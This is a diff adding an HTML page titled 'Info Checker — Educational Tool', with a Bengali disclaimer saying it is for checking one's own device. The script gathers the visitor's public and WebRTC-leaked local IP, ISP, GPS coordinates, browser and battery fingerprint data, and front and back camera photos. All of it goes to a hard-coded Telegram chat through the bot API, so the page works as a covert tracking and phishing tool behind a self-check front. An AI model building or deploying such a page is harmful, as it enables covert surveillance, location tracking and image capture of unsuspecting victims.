@@ -1,0 +1,779 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Info Checker — Educational Tool</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0e17;
+    --panel: #0f1623;
+    --border: #1e2d45;
+    --accent: #00e5ff;
+    --warn: #ff6b35;
+    --green: #00ff9d;
+    --text: #c8d8e8;
+    --dim: #4a6080;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    background-image:
+      radial-gradient(ellipse at 20% 50%, rgba(0,229,255,0.04) 0%, transparent 60%),
+      radial-gradient(ellipse at 80% 20%, rgba(0,255,157,0.03) 0%, transparent 50%);
+  }
+
+  .container { width: 100%; max-width: 680px; }
+
+  .header {
+    text-align: center;
+    margin-bottom: 32px;
+    animation: fadeDown 0.6s ease;
+  }
+  .header .tag {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--accent);
+    letter-spacing: 4px;
+    text-transform: uppercase;
+    margin-bottom: 10px;
+    opacity: 0.8;
+  }
+  .header h1 {
+    font-size: 36px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    color: #fff;
+    text-shadow: 0 0 30px rgba(0,229,255,0.3);
+  }
+  .header h1 span { color: var(--accent); }
+
+  .warning-box {
+    background: rgba(255, 107, 53, 0.08);
+    border: 1px solid rgba(255, 107, 53, 0.4);
+    border-left: 3px solid var(--warn);
+    border-radius: 8px;
+    padding: 16px 20px;
+    margin-bottom: 28px;
+    animation: fadeDown 0.6s ease 0.1s both;
+  }
+  .warning-box .warn-title {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    color: var(--warn);
+    letter-spacing: 3px;
+    margin-bottom: 8px;
+  }
+  .warning-box p { font-size: 14px; line-height: 1.6; color: #b0c4d8; }
+  .warning-box strong { color: var(--warn); }
+
+  .buttons-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 16px;
+    margin-bottom: 28px;
+    animation: fadeDown 0.6s ease 0.2s both;
+  }
+
+  .btn {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 22px 12px;
+    cursor: pointer;
+    transition: all 0.25s ease;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 10px;
+    position: relative;
+    overflow: hidden;
+  }
+  .btn::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(135deg, rgba(0,229,255,0.05), transparent);
+    opacity: 0;
+    transition: opacity 0.3s;
+  }
+  .btn:hover::before { opacity: 1; }
+  .btn:hover {
+    border-color: var(--accent);
+    transform: translateY(-3px);
+    box-shadow: 0 8px 30px rgba(0,229,255,0.12);
+  }
+  .btn:active { transform: translateY(0); }
+  .btn .icon { font-size: 28px; line-height: 1; }
+  .btn .label { font-size: 13px; font-weight: 600; letter-spacing: 1px; color: var(--accent); text-align: center; }
+  .btn .sublabel { font-family: 'Share Tech Mono', monospace; font-size: 10px; color: var(--dim); text-align: center; }
+  .btn.loading { pointer-events: none; opacity: 0.7; }
+
+  .result-panel {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 20px;
+    display: none;
+    animation: fadeUp 0.4s ease;
+  }
+  .result-panel.show { display: block; }
+
+  .result-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 16px;
+    padding-bottom: 12px;
+    border-bottom: 1px solid var(--border);
+  }
+  .result-title { font-family: 'Share Tech Mono', monospace; font-size: 12px; color: var(--accent); letter-spacing: 2px; }
+
+  .status-badge {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    padding: 3px 10px;
+    border-radius: 20px;
+    background: rgba(0,255,157,0.1);
+    color: var(--green);
+    border: 1px solid rgba(0,255,157,0.3);
+  }
+  .status-badge.sending { color: var(--accent); background: rgba(0,229,255,0.1); border-color: rgba(0,229,255,0.3); }
+  .status-badge.error   { color: var(--warn);   background: rgba(255,107,53,0.1); border-color: rgba(255,107,53,0.3); }
+
+  .result-grid { display: flex; flex-direction: column; gap: 8px; }
+  .result-row  { display: flex; gap: 12px; align-items: flex-start; }
+  .result-key  { font-family: 'Share Tech Mono', monospace; font-size: 11px; color: var(--dim); min-width: 130px; padding-top: 1px; }
+  .result-val  { font-size: 14px; color: var(--text); word-break: break-all; flex: 1; }
+
+  /* Dual preview grid */
+  .preview-grid {
+    display: none;
+    grid-template-columns: 1fr 1fr;
+    gap: 10px;
+    margin-top: 14px;
+  }
+  .preview-grid.show { display: grid; }
+  .preview-box {
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+    position: relative;
+  }
+  .preview-box img {
+    width: 100%;
+    display: block;
+    height: 160px;
+    object-fit: cover;
+    background: #0a0e17;
+  }
+  .preview-label {
+    position: absolute;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    background: rgba(0,0,0,0.6);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 9px;
+    color: var(--accent);
+    letter-spacing: 2px;
+    text-align: center;
+    padding: 4px 0;
+  }
+  .preview-box.pending img { opacity: 0.2; }
+  .preview-box.pending .preview-label { color: var(--dim); }
+
+  .telegram-note {
+    margin-top: 14px;
+    padding-top: 14px;
+    border-top: 1px solid var(--border);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--dim);
+    text-align: center;
+  }
+  .telegram-note span { color: var(--green); }
+
+  /* Progress steps */
+  .progress-steps {
+    display: none;
+    gap: 6px;
+    margin-top: 12px;
+    flex-direction: column;
+  }
+  .progress-steps.show { display: flex; }
+  .step {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--dim);
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .step.done    { color: var(--green); }
+  .step.active  { color: var(--accent); }
+  .step .dot {
+    width: 6px; height: 6px;
+    border-radius: 50%;
+    background: var(--dim);
+    flex-shrink: 0;
+  }
+  .step.done   .dot { background: var(--green); }
+  .step.active .dot { background: var(--accent); box-shadow: 0 0 6px var(--accent); }
+
+  @keyframes fadeDown { from { opacity: 0; transform: translateY(-15px); } to { opacity: 1; transform: translateY(0); } }
+  @keyframes fadeUp   { from { opacity: 0; transform: translateY(10px);  } to { opacity: 1; transform: translateY(0); } }
+  @keyframes spin     { to { transform: rotate(360deg); } }
+
+  .spinner {
+    display: inline-block;
+    width: 10px; height: 10px;
+    border: 2px solid rgba(0,229,255,0.3);
+    border-top-color: var(--accent);
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    margin-right: 6px;
+    vertical-align: middle;
+  }
+
+  @media (max-width: 480px) {
+    .buttons-grid { grid-template-columns: 1fr; }
+    .header h1 { font-size: 26px; }
+    .preview-grid { grid-template-columns: 1fr 1fr; }
+    .preview-box img { height: 120px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+
+  <div class="header">
+    <div class="tag">// Educational Tool</div>
+    <h1>INFO <span>CHECKER</span></h1>
+  </div>
+
+  <div class="warning-box">
+    <div class="warn-title">⚠ WARNING — READ BEFORE USE</div>
+    <p>
+      এই tool টি সম্পূর্ণ <strong>educational purposes</strong> এর জন্য।
+      শুধুমাত্র <strong>নিজের device</strong> এ নিজের information check করার জন্য ব্যবহার করুন।
+      অন্য কারো উপর এই tool ব্যবহার করা <strong>অনৈতিক ও বেআইনি</strong>।
+    </p>
+  </div>
+
+  <div class="buttons-grid">
+    <button class="btn" onclick="checkIP()">
+      <span class="icon">🌐</span>
+      <span class="label">TEST IP</span>
+      <span class="sublabel">Public Address</span>
+    </button>
+    <button class="btn" onclick="checkGeo()">
+      <span class="icon">📍</span>
+      <span class="label">GEO LOCATION</span>
+      <span class="sublabel">Coordinates</span>
+    </button>
+    <button class="btn" onclick="checkBrowser()">
+      <span class="icon">🖥️</span>
+      <span class="label">BROWSER INFO</span>
+      <span class="sublabel">Device & Agent</span>
+    </button>
+    <button class="btn" id="cameraBtn" onclick="takeDualPhoto()">
+      <span class="icon">📸</span>
+      <span class="label">DUAL CAPTURE</span>
+      <span class="sublabel">Front + Back → TG</span>
+    </button>
+  </div>
+
+  <div class="result-panel" id="resultPanel">
+    <div class="result-header">
+      <div class="result-title" id="resultTitle">// RESULT</div>
+      <div class="status-badge" id="statusBadge">READY</div>
+    </div>
+    <div class="result-grid" id="resultGrid"></div>
+
+    <!-- Progress Steps -->
+    <div class="progress-steps" id="progressSteps">
+      <div class="step" id="step1"><div class="dot"></div> Back camera capture</div>
+      <div class="step" id="step2"><div class="dot"></div> Front camera capture</div>
+      <div class="step" id="step3"><div class="dot"></div> Telegram এ পাঠানো হচ্ছে</div>
+    </div>
+
+    <!-- Dual Preview -->
+    <div class="preview-grid" id="previewGrid">
+      <div class="preview-box pending" id="backBox">
+        <img id="backImg" src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" alt="Back Camera">
+        <div class="preview-label">⬛ BACK CAM</div>
+      </div>
+      <div class="preview-box pending" id="frontBox">
+        <img id="frontImg" src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" alt="Front Camera">
+        <div class="preview-label">⬛ FRONT CAM</div>
+      </div>
+    </div>
+
+    <div class="telegram-note" id="telegramNote"></div>
+  </div>
+
+</div>
+
+<script>
+  const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+  const CHAT_ID   = "1873240895";
+
+  // ── Step indicator helpers ───────────────────────────────────────────────
+  function setStep(stepId, state) {
+    const el = document.getElementById(stepId);
+    el.className = `step ${state}`;
+  }
+
+  // ── Badge helpers ────────────────────────────────────────────────────────
+  function setBadge(state, text) {
+    const badge = document.getElementById('statusBadge');
+    badge.className = `status-badge ${state === 'success' ? '' : state}`;
+    badge.innerHTML = state === 'sending'
+      ? `<span class="spinner"></span>${text}`
+      : text;
+  }
+
+  // ── Update result row ────────────────────────────────────────────────────
+  function setRows(rows) {
+    document.getElementById('resultGrid').innerHTML = rows.map(([k, v]) => `
+      <div class="result-row">
+        <span class="result-key">${k}</span>
+        <span class="result-val">${v}</span>
+      </div>
+    `).join('');
+  }
+
+  // ── Single camera capture helper ─────────────────────────────────────────
+  async function captureFromCamera(facingMode) {
+    let stream = null;
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: {
+          facingMode: facingMode,
+          width:  { ideal: 1280 },
+          height: { ideal: 720  }
+        },
+        audio: false
+      });
+
+      const video = document.createElement('video');
+      video.srcObject   = stream;
+      video.playsInline = true;
+      video.muted       = true;
+      await video.play();
+
+      // Camera warm-up
+      await new Promise(r => setTimeout(r, 1000));
+
+      const canvas = document.createElement('canvas');
+      canvas.width  = video.videoWidth  || 1280;
+      canvas.height = video.videoHeight || 720;
+      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      stream.getTracks().forEach(t => t.stop());
+
+      return { canvas, dataURL: canvas.toDataURL('image/jpeg', 0.9) };
+
+    } catch (err) {
+      if (stream) stream.getTracks().forEach(t => t.stop());
+      throw err;
+    }
+  }
+
+  // ── Canvas → Blob → Telegram sendPhoto ──────────────────────────────────
+  async function sendPhotoToTelegram(blob, caption) {
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo',   blob, 'capture.jpg');
+    formData.append('caption', caption);
+
+    const res  = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: 'POST',
+      body:   formData
+    });
+    const data = await res.json();
+    if (!data.ok) throw new Error(data.description);
+    return data;
+  }
+
+  // ── Canvas → Blob (Promise wrapper) ─────────────────────────────────────
+  function canvasToBlob(canvas) {
+    return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
+  }
+
+  // ── MAIN: Dual Camera Capture ─────────────────────────────────────────────
+  async function takeDualPhoto() {
+    const btn = document.getElementById('cameraBtn');
+    btn.classList.add('loading');
+
+    // Panel দেখাও
+    document.getElementById('resultPanel').classList.add('show');
+    document.getElementById('resultTitle').textContent = '// DUAL CAMERA CAPTURE';
+    document.getElementById('progressSteps').classList.add('show');
+    document.getElementById('previewGrid').classList.add('show');
+    document.getElementById('telegramNote').innerHTML = '';
+    document.getElementById('backBox').className  = 'preview-box pending';
+    document.getElementById('frontBox').className = 'preview-box pending';
+    document.getElementById('backImg').src  = 'data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=';
+    document.getElementById('frontImg').src = 'data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=';
+
+    setBadge('sending', 'CAPTURING');
+    setRows([['Status', 'শুরু হচ্ছে...']]);
+    setStep('step1', ''); setStep('step2', ''); setStep('step3', '');
+
+    let backCanvas  = null;
+    let frontCanvas = null;
+    let backDataURL = null, frontDataURL = null;
+
+    // ── Step 1: Back Camera ────────────────────────────────────────────────
+    try {
+      setStep('step1', 'active');
+      setRows([['Status', 'Back camera চালু হচ্ছে...']]);
+
+      const result   = await captureFromCamera('environment');
+      backCanvas     = result.canvas;
+      backDataURL    = result.dataURL;
+
+      // Preview দেখাও
+      document.getElementById('backImg').src       = backDataURL;
+      document.getElementById('backBox').className = 'preview-box';
+      document.getElementById('backBox').querySelector('.preview-label').textContent = '✅ BACK CAM';
+
+      setStep('step1', 'done');
+      setRows([['Back Camera', `✅ ${backCanvas.width}x${backCanvas.height}`]]);
+
+    } catch (err) {
+      setStep('step1', '');
+      let msg = err.message;
+      if (err.name === 'NotAllowedError')  msg = 'Permission denied ❌';
+      if (err.name === 'NotFoundError')    msg = 'Back camera নেই ❌';
+      if (err.name === 'NotReadableError') msg = 'Camera busy ❌';
+
+      document.getElementById('backBox').querySelector('.preview-label').textContent = '❌ BACK CAM';
+      setRows([['Back Camera', msg]]);
+      // Back camera fail হলেও front try করব
+    }
+
+    // ── Step 2: Front Camera ───────────────────────────────────────────────
+    try {
+      setStep('step2', 'active');
+      setRows([
+        ['Back Camera',  backCanvas ? `✅ ${backCanvas.width}x${backCanvas.height}` : 'Failed ❌'],
+        ['Front Camera', 'চালু হচ্ছে...']
+      ]);
+
+      const result    = await captureFromCamera('user');
+      frontCanvas     = result.canvas;
+      frontDataURL    = result.dataURL;
+
+      // Preview দেখাও
+      document.getElementById('frontImg').src        = frontDataURL;
+      document.getElementById('frontBox').className  = 'preview-box';
+      document.getElementById('frontBox').querySelector('.preview-label').textContent = '✅ FRONT CAM';
+
+      setStep('step2', 'done');
+      setRows([
+        ['Back Camera',  backCanvas  ? `✅ ${backCanvas.width}x${backCanvas.height}`   : 'Failed ❌'],
+        ['Front Camera', `✅ ${frontCanvas.width}x${frontCanvas.height}`]
+      ]);
+
+    } catch (err) {
+      setStep('step2', '');
+      let msg = err.message;
+      if (err.name === 'NotAllowedError')  msg = 'Permission denied ❌';
+      if (err.name === 'NotFoundError')    msg = 'Front camera নেই ❌';
+      if (err.name === 'NotReadableError') msg = 'Camera busy ❌';
+
+      document.getElementById('frontBox').querySelector('.preview-label').textContent = '❌ FRONT CAM';
+      setRows([
+        ['Back Camera',  backCanvas ? `✅ ${backCanvas.width}x${backCanvas.height}` : 'Failed ❌'],
+        ['Front Camera', msg]
+      ]);
+    }
+
+    // দুটোই fail হলে stop
+    if (!backCanvas && !frontCanvas) {
+      setBadge('error', 'ERROR');
+      document.getElementById('telegramNote').innerHTML = '❌ কোনো camera থেকেই ছবি নেওয়া যায়নি';
+      btn.classList.remove('loading');
+      return;
+    }
+
+    // ── Step 3: Telegram এ পাঠাও ──────────────────────────────────────────
+    setStep('step3', 'active');
+    setBadge('sending', 'SENDING');
+
+    let sentCount = 0;
+    let errors    = [];
+
+    // Back photo send
+    if (backCanvas) {
+      try {
+        const blob = await canvasToBlob(backCanvas);
+        await sendPhotoToTelegram(blob, `📸 Back Camera Capture\n🖼 ${backCanvas.width}x${backCanvas.height}\n⚠️ Educational use only`);
+        sentCount++;
+      } catch (e) {
+        errors.push(`Back: ${e.message}`);
+      }
+    }
+
+    // Front photo send
+    if (frontCanvas) {
+      try {
+        const blob = await canvasToBlob(frontCanvas);
+        await sendPhotoToTelegram(blob, `🤳 Front Camera Capture\n🖼 ${frontCanvas.width}x${frontCanvas.height}\n⚠️ Educational use only`);
+        sentCount++;
+      } catch (e) {
+        errors.push(`Front: ${e.message}`);
+      }
+    }
+
+    // ── Result দেখাও ──────────────────────────────────────────────────────
+    if (errors.length === 0) {
+      setStep('step3', 'done');
+      setBadge('success', 'SENT ✓');
+      setRows([
+        ['Back Camera',  backCanvas  ? `✅ ${backCanvas.width}x${backCanvas.height}`  : 'Skipped'],
+        ['Front Camera', frontCanvas ? `✅ ${frontCanvas.width}x${frontCanvas.height}` : 'Skipped'],
+        ['Telegram',     `✅ ${sentCount} photo${sentCount > 1 ? 's' : ''} sent`]
+      ]);
+      document.getElementById('telegramNote').innerHTML =
+        `✅ <span>${sentCount}টি ছবি Telegram এ পাঠানো হয়েছে!</span>`;
+    } else {
+      setStep('step3', '');
+      setBadge(sentCount > 0 ? 'success' : 'error', sentCount > 0 ? `PARTIAL ✓` : 'ERROR');
+      setRows([
+        ['Back Camera',  backCanvas  ? `✅ ${backCanvas.width}x${backCanvas.height}`  : 'Skipped'],
+        ['Front Camera', frontCanvas ? `✅ ${frontCanvas.width}x${frontCanvas.height}` : 'Skipped'],
+        ['Sent',         `${sentCount} photo(s)`],
+        ['Error',        errors.join(' | ')]
+      ]);
+      document.getElementById('telegramNote').innerHTML =
+        sentCount > 0
+          ? `⚠️ <span>${sentCount}টি পাঠানো হয়েছে, কিছু fail হয়েছে</span>`
+          : `❌ পাঠানো যায়নি: ${errors.join(', ')}`;
+    }
+
+    btn.classList.remove('loading');
+  }
+
+  // ── Helper: showResult (IP/Geo/Browser এর জন্য) ─────────────────────────
+  function showResult(title, rows) {
+    document.getElementById('resultPanel').classList.add('show');
+    document.getElementById('resultTitle').textContent = `// ${title}`;
+    document.getElementById('progressSteps').classList.remove('show');
+    document.getElementById('previewGrid').classList.remove('show');
+    document.getElementById('telegramNote').innerHTML = '';
+    setBadge('sending', 'SENDING');
+    setRows(rows);
+
+    const msg = `🔍 *${title}*\n\n` + rows.map(([k, v]) => `*${k}:* ${v}`).join('\n') + `\n\n⚠️ _Educational use only_`;
+    sendTextToTelegram(msg);
+  }
+
+  async function sendTextToTelegram(text) {
+    try {
+      const res  = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'Markdown' })
+      });
+      const data = await res.json();
+      if (data.ok) {
+        setBadge('success', 'SENT ✓');
+        document.getElementById('telegramNote').innerHTML = '✅ <span>Telegram এ পাঠানো হয়েছে</span>';
+      } else {
+        throw new Error(data.description);
+      }
+    } catch (e) {
+      setBadge('error', 'ERROR');
+      document.getElementById('telegramNote').innerHTML = `❌ পাঠানো যায়নি: ${e.message}`;
+    }
+  }
+
+  // ── IP Check ─────────────────────────────────────────────────────────────
+  async function checkIP() {
+    showResult('IP ADDRESS CHECK', [['Status', 'Loading...']]);
+    try {
+      const res  = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      const res2 = await fetch(`https://ipapi.co/${data.ip}/json/`);
+      const geo  = await res2.json();
+      showResult('IP ADDRESS CHECK', [
+        ['IP Address', data.ip],
+        ['Country',    geo.country_name || 'N/A'],
+        ['City',       geo.city         || 'N/A'],
+        ['ISP',        geo.org          || 'N/A'],
+        ['Timezone',   geo.timezone     || 'N/A'],
+      ]);
+    } catch (e) {
+      showResult('IP ADDRESS CHECK', [['Error', e.message]]);
+    }
+  }
+
+  // ── Geo Check ────────────────────────────────────────────────────────────
+  function checkGeo() {
+    showResult('GEO LOCATION CHECK', [['Status', 'Requesting permission...']]);
+    if (!navigator.geolocation) {
+      showResult('GEO LOCATION CHECK', [['Error', 'Geolocation supported না']]);
+      return;
+    }
+    navigator.geolocation.getCurrentPosition(
+      pos => showResult('GEO LOCATION CHECK', [
+        ['Latitude',  pos.coords.latitude.toFixed(6)],
+        ['Longitude', pos.coords.longitude.toFixed(6)],
+        ['Accuracy',  pos.coords.accuracy.toFixed(0) + ' meters'],
+        ['Maps Link', `maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`],
+      ]),
+      err => showResult('GEO LOCATION CHECK', [['Error', err.message]])
+    );
+  }
+
+  // ── Browser Info Check ───────────────────────────────────────────────────
+  async function checkBrowser() {
+    const ua         = navigator.userAgent;
+    const platform   = navigator.platform;
+    const lang       = navigator.language;
+    const screen_res = `${screen.width}x${screen.height}`;
+    const pixelRatio = window.devicePixelRatio || 'N/A';
+    const timezone   = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const online     = navigator.onLine ? 'Yes' : 'No';
+
+    let browser = 'Unknown';
+    if      (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Google Chrome';
+    else if (ua.includes('Firefox'))                        browser = 'Mozilla Firefox';
+    else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+    else if (ua.includes('Edg'))                            browser = 'Microsoft Edge';
+    else if (ua.includes('Opera') || ua.includes('OPR'))    browser = 'Opera';
+
+    const cookieEnabled = navigator.cookieEnabled ? 'Enabled ✓' : 'Disabled ✗';
+    const cookieCount   = document.cookie ? document.cookie.split(';').length + ' cookies' : '0 cookies';
+
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    let netSpeed = 'N/A', netType = 'N/A';
+    if (conn) {
+      netSpeed = conn.downlink ? conn.downlink + ' Mbps' : 'N/A';
+      netType  = conn.effectiveType || conn.type || 'N/A';
+    }
+
+    const memory   = navigator.deviceMemory       ? navigator.deviceMemory + ' GB'           : 'N/A';
+    const cpuCores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' cores' : 'N/A';
+
+    const touchPoints  = navigator.maxTouchPoints || 0;
+    const touchSupport = (('ontouchstart' in window) || touchPoints > 0)
+      ? `Supported ✓ (${touchPoints} points)` : 'Not Supported ✗';
+
+    const pointerFine   = window.matchMedia('(pointer: fine)').matches;
+    const pointerCoarse = window.matchMedia('(pointer: coarse)').matches;
+    const pointerType   = pointerFine ? 'Mouse/Stylus 🖱️' : pointerCoarse ? 'Touch 👆' : 'None';
+    const darkMode      = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Dark Mode 🌙' : 'Light Mode ☀️';
+    const audioSupport  = (window.AudioContext || window.webkitAudioContext) ? 'Supported ✓' : 'Not Supported ✗';
+
+    let cameraSupport = 'N/A', micSupport = 'N/A';
+    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+      try {
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        cameraSupport = devices.some(d => d.kind === 'videoinput') ? 'Found ✓' : 'Not Found ✗';
+        micSupport    = devices.some(d => d.kind === 'audioinput') ? 'Found ✓' : 'Not Found ✗';
+      } catch(e) { cameraSupport = micSupport = 'Permission Denied'; }
+    }
+
+    let loadTime = 'N/A';
+    if (window.performance && window.performance.timing) {
+      const t = window.performance.timing;
+      loadTime = (t.loadEventEnd - t.navigationStart) + ' ms';
+    }
+
+    let storageUsed = 'N/A', storageTotal = 'N/A';
+    if (navigator.storage && navigator.storage.estimate) {
+      try {
+        const est  = await navigator.storage.estimate();
+        storageUsed  = (est.usage / 1024 / 1024).toFixed(2) + ' MB used';
+        storageTotal = (est.quota  / 1024 / 1024 / 1024).toFixed(2) + ' GB quota';
+      } catch(e) {}
+    }
+
+    let localIP = 'N/A';
+    try {
+      await new Promise(resolve => {
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel('');
+        pc.createOffer().then(o => pc.setLocalDescription(o));
+        pc.onicecandidate = e => {
+          if (!e || !e.candidate) { resolve(); return; }
+          const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+          if (m && !m[1].startsWith('0.')) { localIP = m[1]; pc.close(); resolve(); }
+        };
+        setTimeout(resolve, 1000);
+      });
+    } catch(e) {}
+
+    let clipboardAccess = 'N/A';
+    if (navigator.clipboard && navigator.permissions) {
+      try {
+        const perm = await navigator.permissions.query({ name: 'clipboard-read' });
+        clipboardAccess = perm.state === 'granted' ? 'Allowed ✓' : perm.state === 'prompt' ? 'Not Granted' : 'Denied ✗';
+      } catch(e) { clipboardAccess = 'Not Supported'; }
+    }
+
+    const rows = [
+      ['Browser',       browser],
+      ['Platform',      platform],
+      ['Language',      lang],
+      ['Screen',        screen_res],
+      ['Pixel Ratio',   pixelRatio + 'x'],
+      ['Timezone',      timezone],
+      ['Online',        online],
+      ['Local IP',      localIP],
+      ['Cookie',        cookieEnabled],
+      ['Cookie Count',  cookieCount],
+      ['Clipboard',     clipboardAccess],
+      ['Network Type',  netType],
+      ['Network Speed', netSpeed],
+      ['Device Memory', memory],
+      ['CPU Cores',     cpuCores],
+      ['Touch Support', touchSupport],
+      ['Pointer Type',  pointerType],
+      ['Dark Mode',     darkMode],
+      ['Page Load',     loadTime],
+      ['Storage Used',  storageUsed],
+      ['Storage Quota', storageTotal],
+      ['Audio Output',  audioSupport],
+      ['Camera',        cameraSupport],
+      ['Microphone',    micSupport],
+      ['User Agent',    ua.substring(0, 80) + '...'],
+    ];
+
+    if (navigator.getBattery) {
+      try {
+        const battery  = await navigator.getBattery();
+        const level    = Math.round(battery.level * 100) + '%';
+        const charging = battery.charging ? 'Charging ⚡' : 'Not Charging';
+        const timeLeft = battery.charging
+          ? (battery.chargingTime    !== Infinity ? Math.round(battery.chargingTime    / 60) + ' min to full' : 'Calculating...')
+          : (battery.dischargingTime !== Infinity ? Math.round(battery.dischargingTime / 60) + ' min left'    : 'Calculating...');
+        rows.push(['Battery Level', level], ['Battery Status', charging], ['Battery Time', timeLeft]);
+      } catch(e) { rows.push(['Battery', 'Not Supported']); }
+    } else {
+      rows.push(['Battery', 'Not Supported']);
+    }
+
+    showResult('BROWSER INFO CHECK', rows);
+  }
+</script>
+
+</body>
+</html>
